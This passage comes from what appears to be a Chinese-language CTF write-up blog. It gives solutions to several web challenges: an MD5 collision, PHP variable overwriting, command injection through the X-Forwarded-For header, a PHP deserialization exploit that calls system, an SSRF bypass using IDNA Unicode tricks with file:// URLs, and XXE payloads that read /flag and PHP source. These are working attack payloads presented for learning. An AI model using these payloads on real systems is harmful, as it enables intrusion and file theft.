class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%55</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span>
&amp;b=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%02</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%d5</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span></code></pre></div>

<p><img src="https://i.loli.net/2020/10/24/N5pyKHGSTAYas3n.png" srcset="/img/loading.gif" alt="web-2.png"></p>
<p><img src="https://i.loli.net/2020/10/24/lfOzTIEwbBJDaMx.png" srcset="/img/loading.gif" alt="web-3.png"></p>
<p>参考： <a href="https://www.jianshu.com/p/21e3e1f74c08" target="_blank" rel="noopener">https://www.jianshu.com/p/21e3e1f74c08</a></p>
<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>变量覆盖</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">include</span> <span class="hljs-string">'flag.php'</span>;

$yds = <span class="hljs-string">"dog"</span>;
$is = <span class="hljs-string">"cat"</span>;
$handsome = <span class="hljs-string">'yds'</span>;

<span class="hljs-keyword">foreach</span>($_POST <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;<span class="hljs-comment">//$flag=flag</span>
    $$x = $y;
&#125;
$flag = flag 

<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;  <span class="hljs-comment">//yds=flag</span>
    $$x = $$y; <span class="hljs-comment">//$yds = $flag </span>
&#125;

<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;
    <span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">'flag'</span>] === $x &amp;&amp; $x !== <span class="hljs-string">'flag'</span>)&#123; <span class="hljs-comment">// yds=flag</span>
        <span class="hljs-keyword">exit</span>($handsome);
    &#125;
&#125;

<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'flag'</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'flag'</span>]))&#123;
    <span class="hljs-keyword">exit</span>($yds);
&#125;

<span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">'flag'</span>] === <span class="hljs-string">'flag'</span>  || $_GET[<span class="hljs-string">'flag'</span>] === <span class="hljs-string">'flag'</span>)&#123;
    <span class="hljs-keyword">exit</span>($is);
&#125;


<span class="hljs-keyword">echo</span> <span class="hljs-string">"the flag is: "</span>.$flag;</code></pre></div>

<p>poyload:</p>
<div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">yds</span>=flag
POST: <span class="hljs-variable">$flag</span>=flag</code></pre></div>

<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>进入页面不知道干啥，随便点点，到flag.php时显示了IP地址</p>
<p>查看原码发现提示<code>&lt;!-- Do you know why i know your ip? --&gt;</code></p>
<p>猜测这里是跟XFF有关，于是修改XFF:127.0.0.1，果然页面显示的就是IP是127.0.0.1</p>
<p>这里就想到了XFF注入，是否可以类似于XFF注入，将系统名令注入进去</p>
<p>首先试试<code>system(&quot;ls /&quot;)</code>,但是发现没有被执行，于是家上括号<code>{system(&quot;ls /&quot;)}</code>，这次执行成功</p>
<p><img src="https://i.loli.net/2020/10/24/EGtFP2INmuhgroY.png" srcset="/img/loading.gif" alt="ip-1.png"></p>
<p>最后获取flag, <code>{system(cat /flag)}</code></p>
<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    $disable_fun = <span class="hljs-keyword">array</span>(<span class="hljs-string">"exec"</span>,<span class="hljs-string">"shell_exec"</span>,<span class="hljs-string">"system"</span>,<span class="hljs-string">"passthru"</span>,<span class="hljs-string">"proc_open"</span>,<span class="hljs-string">"show_source"</span>,<span class="hljs-string">"phpinfo"</span>,<span class="hljs-string">"popen"</span>,<span class="hljs-string">"dl"</span>,<span class="hljs-string">"eval"</span>,<span class="hljs-string">"proc_terminate"</span>,<span class="hljs-string">"touch"</span>,<span class="hljs-string">"escapeshellcmd"</span>,<span class="hljs-string">"escapeshellarg"</span>,<span class="hljs-string">"assert"</span>,<span class="hljs-string">"substr_replace"</span>,<span class="hljs-string">"call_user_func_array"</span>,<span class="hljs-string">"call_user_func"</span>,<span class="hljs-string">"array_filter"</span>, <span class="hljs-string">"array_walk"</span>,  <span class="hljs-string">"array_map"</span>,<span class="hljs-string">"registregister_shutdown_function"</span>,<span class="hljs-string">"register_tick_function"</span>,<span class="hljs-string">"filter_var"</span>, <span class="hljs-string">"filter_var_array"</span>, <span class="hljs-string">"uasort"</span>, <span class="hljs-string">"uksort"</span>, <span class="hljs-string">"array_reduce"</span>,<span class="hljs-string">"array_walk"</span>, <span class="hljs-string">"array_walk_recursive"</span>,<span class="hljs-string">"pcntl_exec"</span>,<span class="hljs-string">"fopen"</span>,<span class="hljs-string">"fwrite"</span>,<span class="hljs-string">"file_put_contents"</span>);
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span><span class="hljs-params">($func, $p)</span> </span>&#123;
        $result = call_user_func($func, $p);
        $a= gettype($result);
        <span class="hljs-keyword">if</span> ($a == <span class="hljs-string">"string"</span>) &#123;
            <span class="hljs-keyword">return</span> $result;
        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;&#125;
    &#125;
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;
        <span class="hljs-keyword">var</span> $p = <span class="hljs-string">"Y-m-d h:i:s a"</span>;
        <span class="hljs-keyword">var</span> $func = <span class="hljs-string">"date"</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">""</span>) &#123;
                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);
            &#125;
        &#125;
    &#125;
    $func = $_REQUEST[<span class="hljs-string">"func"</span>];
    $p = $_REQUEST[<span class="hljs-string">"p"</span>];

    <span class="hljs-keyword">if</span> ($func != <span class="hljs-keyword">null</span>) &#123;
        $func = strtolower($func);
        <span class="hljs-keyword">if</span> (!in_array($func,$disable_fun)) &#123;
            <span class="hljs-keyword">echo</span> gettime($func, $p);
        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"Hacker..."</span>);
        &#125;
    &#125;
    <span class="hljs-meta">?&gt;</span></code></pre></div>

<p>exp</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;
        <span class="hljs-keyword">var</span> $p = <span class="hljs-string">"Y-m-d h:i:s a"</span>;
        <span class="hljs-keyword">var</span> $func = <span class="hljs-string">"date"</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">""</span>) &#123;
                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);
            &#125;
        &#125;
    &#125;
$a = <span class="hljs-keyword">new</span> Test();
$a-&gt;p=<span class="hljs-string">"cat /tmp/flagoefiu4r93"</span>;
$a-&gt;func=<span class="hljs-string">"system"</span>;
<span class="hljs-keyword">print</span>(urlencode(serialize($a)));

<span class="hljs-meta">?&gt;</span></code></pre></div>

<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span>
<span class="hljs-comment">#encoding=utf-8</span>
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> urllib
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> json
reload(sys)
sys.setdefaultencoding(<span class="hljs-string">'latin1'</span>)

app = Flask(__name__)

secert_key = os.urandom(<span class="hljs-number">16</span>)

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, action, param, sign, ip)</span>:</span>
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)): <span class="hljs-comment">#SandBox For Remote_Addr</span>
            os.mkdir(self.sandbox)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span><span class="hljs-params">(self)</span>:</span>
        result = &#123;&#125;
        result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">500</span>
        <span class="hljs-keyword">if</span> (self.checkSign()):
            <span class="hljs-keyword">if</span> <span class="hljs-string">"scan"</span> <span class="hljs-keyword">in</span> self.action:
                tmpfile = open(<span class="hljs-string">"./%s/result.txt"</span> % self.sandbox, <span class="hljs-string">'w'</span>)
                resp = scan(self.param)
                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">"Connection Timeout"</span>):
                    result[<span class="hljs-string">'data'</span>] = resp
                <span class="hljs-keyword">else</span>:
                    <span class="hljs-keyword">print</span> resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">200</span>
            <span class="hljs-keyword">if</span> <span class="hljs-string">"read"</span> <span class="hljs-keyword">in</span> self.action:
                f = open(<span class="hljs-string">"./%s/result.txt"</span> % self.sandbox, <span class="hljs-string">'r'</span>)
                result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">200</span>
                result[<span class="hljs-string">'data'</span>] = f.read()
            <span class="hljs-keyword">if</span> result[<span class="hljs-string">'code'</span>] == <span class="hljs-number">500</span>:
                result[<span class="hljs-string">'data'</span>] = <span class="hljs-string">"Action Error"</span>
        <span class="hljs-keyword">else</span>:
            result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">500</span>
            result[<span class="hljs-string">'msg'</span>] = <span class="hljs-string">"Sign Error"</span>
        <span class="hljs-keyword">return</span> result

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-comment">#generate Sign For Action Scan.</span>
<span class="hljs-meta">@app.route("/geneSign", methods=['GET', 'POST'])</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span><span class="hljs-params">()</span>:</span>
    param = urllib.unquote(request.args.get(<span class="hljs-string">"param"</span>, <span class="hljs-string">""</span>))
    action = <span class="hljs-string">"scan"</span>
    <span class="hljs-keyword">return</span> getSign(action, param)

<span class="hljs-meta">@app.route('/De1ta',methods=['GET','POST'])</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span><span class="hljs-params">()</span>:</span>
    action = urllib.unquote(request.cookies.get(<span class="hljs-string">"action"</span>))
    param = urllib.unquote(request.args.get(<span class="hljs-string">"param"</span>, <span class="hljs-string">""</span>))
    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">"sign"</span>))
    ip = request.remote_addr
    <span class="hljs-keyword">if</span>(waf(param)):
        <span class="hljs-keyword">return</span> <span class="hljs-string">"No Hacker!!!!"</span>
    task = Task(action, param, sign, ip)
    <span class="hljs-keyword">return</span> json.dumps(task.Exec())
<span class="hljs-meta">@app.route('/')</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">return</span> open(<span class="hljs-string">"code.txt"</span>,<span class="hljs-string">"r"</span>).read()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span><span class="hljs-params">(param)</span>:</span>
    socket.setdefaulttimeout(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Connection Timeout"</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span><span class="hljs-params">(action, param)</span>:</span>
    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(content)</span>:</span>
    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span><span class="hljs-params">(param)</span>:</span>
    check=param.strip().lower()
    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">"gopher"</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">"file"</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.debug = <span class="hljs-literal">False</span>
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>,port=<span class="hljs-number">80</span>)</code></pre></div>



<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>题目给出了源码</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-meta">@app.route('/getUrl', methods=['GET', 'POST'])</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUrl</span><span class="hljs-params">()</span>:</span>
    url = request.args.get(<span class="hljs-string">"url"</span>)  <span class="hljs-comment"># 获取get提交的url参数</span>
    host = parse.urlparse(url).hostname <span class="hljs-comment">#获取url中的主机名</span>
    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:            
        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 111"</span>
    parts = list(urlsplit(url))       <span class="hljs-comment">#将url分隔开 协议类型 主机名 文件路径 存入列表 parts[1]为主机名</span>
    host = parts[<span class="hljs-number">1</span>]
    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 222 "</span> + host
    newhost = []
    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">'.'</span>):
        newhost.append(h.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>))   <span class="hljs-comment">#将主机名以.为分割 进行utf-8解码</span>
    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">'.'</span>.join(newhost)         <span class="hljs-comment">#重新组成主机名</span>
    <span class="hljs-comment">#去掉 url 中的空格</span>
    finalUrl = urlunsplit(parts).split(<span class="hljs-string">' '</span>)[<span class="hljs-number">0</span>]
    host = parse.urlparse(finalUrl).hostname   <span class="hljs-comment"># 获取新的主机名   </span>
    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read()
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 333"</span>
   
    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;
    &lt;!-- Do you know the nginx? --&gt;</code></pre></div>



<p>考察点1：</p>
<blockquote>
<p>2019black hat一个议题</p>
<div class="hljs"><pre><code class="hljs awk">https:<span class="hljs-regexp">//i</span>.blackhat.com<span class="hljs-regexp">/USA-19/</span>Thursday<span class="hljs-regexp">/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</span></code></pre></div>

<p>在unicode中字符℀(U+2100)，当IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。</p>
</blockquote>
<img src="https://i.loli.net/2020/10/29/5ixom8Hq7UYdRBV.png" srcset="/img/loading.gif" alt="utf-8.png" style="zoom:50%;">

<p>考察点2:</p>
<blockquote>
<p>Nginx服务器</p>
<p><a href="https://zhuanlan.zhihu.com/p/34943332，这篇文章介绍的很详细" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34943332，这篇文章介绍的很详细</a></p>
<p>这里只要知道nginx服务器的主要文件路径</p>
<p>配置文件存放目录：/etc/nginx </p>
<p>主配置文件：/etc/nginx/conf/nginx.conf </p>
<p>管理脚本：/usr/lib64/systemd/system/nginx.service </p>
<p>模块：/usr/lisb64/nginx/modules </p>
<p>应用程序：/usr/sbin/nginx </p>
<p>程序默认存放位置：/usr/share/nginx/html </p>
<p>日志默认存放位置：/var/log/nginx </p>
<p>配置文件目录为：/usr/local/nginx/conf/nginx.conf  //这题要用到的路径</p>
</blockquote>
<p>这里要读取的是文件，所以使用的file协议</p>
<p>直接够造</p>
<div class="hljs"><pre><code class="hljs vim"><span class="hljs-keyword">file</span>://suctf.<span class="hljs-keyword">cc</span>/usr/local/nginx/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span>
利用漏洞改为
<span class="hljs-keyword">file</span>://suctf.<span class="hljs-keyword">c</span>℆sr/local/nginx/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span></code></pre></div>

<p>给出flag路径</p>
<div class="hljs"><pre><code class="hljs crmsh">server &#123; listen <span class="hljs-number">80</span>; <span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123; try_files</span> $uri @app; &#125; <span class="hljs-keyword">location</span> <span class="hljs-title">@app</span> &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; <span class="hljs-keyword">location</span> <span class="hljs-title">/static</span> &#123; alias /app/static; &#125; <span class="hljs-comment"># location /flag &#123; # alias /usr/fffffflag; # &#125; &#125;</span>
 
构造
file://suctf.c℆sr/fffffflag

拿到flag</code></pre></div>

<p>为了直观感受url处理过程，写了脚本</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlsplit, urlunsplit
url= <span class="hljs-string">"file://suctf.c℆sr/local/nginx/conf/nginx.conf"</span>
host = parse.urlparse(url).hostname
<span class="hljs-comment">#print(host)</span>
parts = list(urlsplit(url))
print(parts)
newhost=[]
<span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">'.'</span>):
    newhost.append(h.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>))
print(newhost)
parts[<span class="hljs-number">1</span>] = <span class="hljs-string">'.'</span>.join(newhost)
print(parts)
finalUrl = urlunsplit(parts).split(<span class="hljs-string">' '</span>)[<span class="hljs-number">0</span>]
print(finalUrl)</code></pre></div>

<p>结果</p>
<div class="hljs"><pre><code class="hljs vim">[<span class="hljs-string">'file'</span>, <span class="hljs-string">'suctf.c℆sr'</span>, <span class="hljs-string">'/local/nginx/conf/nginx.conf'</span>, <span class="hljs-string">''</span>, <span class="hljs-string">''</span>]
[<span class="hljs-string">'suctf'</span>, <span class="hljs-string">'cc/usr'</span>]
[<span class="hljs-string">'file'</span>, <span class="hljs-string">'suctf.cc/usr'</span>, <span class="hljs-string">'/local/nginx/conf/nginx.conf'</span>, <span class="hljs-string">''</span>, <span class="hljs-string">''</span>]
<span class="hljs-keyword">file</span>://suctf.<span class="hljs-keyword">cc</span>/usr/local/nginx/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span></code></pre></div>



<p>找出类似可用字符的脚本</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">128</span>,<span class="hljs-number">65537</span>):
    tmp=chr(i)
    <span class="hljs-keyword">try</span>:
        res = tmp.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>)
        <span class="hljs-keyword">if</span>(<span class="hljs-string">"-"</span>) <span class="hljs-keyword">in</span> res:
            <span class="hljs-keyword">continue</span>
        print(<span class="hljs-string">"U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; "</span>.format(tmp, res, i))
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">pass</span></code></pre></div>

<hr>
<p>参考：</p>
<blockquote>
<p><a href="https://blog.csdn.net/qq_42181428/article/details/99741920" target="_blank" rel="noopener">https://blog.csdn.net/qq_42181428/article/details/99741920</a></p>
</blockquote>
<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p><code>xxe</code>攻击</p>
<p>抓包显示的结果是</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>a<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div>

<p>是xml格式的数据，所以可能存在xxe漏洞（外部实体注入），即利用输入位置向存储的表中添加一个外部实体，让这个实体包含内部文件，造成数据泄露。</p>
<p>xml注入是利用闭合标签改写XML文件实现更改数据，xxe是引用外部实体来达到目的。</p>
<p>php引用外部实体，常见的协议</p>
<div class="hljs"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>://文件绝对路径 如：<span class="hljs-built_in">file</span>:<span class="hljs-comment">///etc/passwd</span>
<span class="hljs-keyword">http</span>://url/<span class="hljs-built_in">file</span>.txt
php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=xxx.php</code></pre></div>

<p>这篇博客写的很清楚，<a href="https://xz.aliyun.com/t/6887" target="_blank" rel="noopener">传送门</a></p>
<p>直接构造payload，拿到flag</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">hack</span> [</span>
<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span>  <span class="hljs-meta-string">"file:///flag"</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div>

<blockquote>
<!ENTITY file SYSTEM  "file:///flag">

<p>这里的file是外部实体</p>
<p><username>&file;</username></p>
<p>这里的&amp;file是xml中的参数</p>
</blockquote>
<p>还可以用php://filter/read=convert.base64-encode/resource=xxx.php,读取源码</p>
<p>直接构造</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">hack</span> [</span>
<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span>  <span class="hljs-meta-string">"php://filter/read=convert.base64-encode/resource=doLogin.php"</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div>

<p>解码后的源码，可以拿到admin和密码，但是登录也没啥东西，考察点就是xxe。。。</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/**</span>
<span class="hljs-comment">* autor: c0ny1</span>
<span class="hljs-comment">* date: 2018-2-7</span>
<span class="hljs-comment">*/</span>

$USERNAME = <span class="hljs-string">'admin'</span>; <span class="hljs-comment">//璐﹀彿</span>
$PASSWORD = <span class="hljs-string">'024b87931a03f738fff6693ce0a78c88'</span>; <span class="hljs-comment">//瀵嗙爜</span>
$result = <span class="hljs-keyword">null</span>;

libxml_disable_entity_loader(<span class="hljs-keyword">false</span>);
$xmlfile = file_get_contents(<span class="hljs-string">'php://input'</span>);

<span class="hljs-keyword">try</span>&#123;
	$dom = <span class="hljs-keyword">new</span> DOMDocument();
	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$creds = simplexml_import_dom($dom);

	$username = $creds-&gt;username;
	$password = $creds-&gt;password;

	<span class="hljs-keyword">if</span>($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;
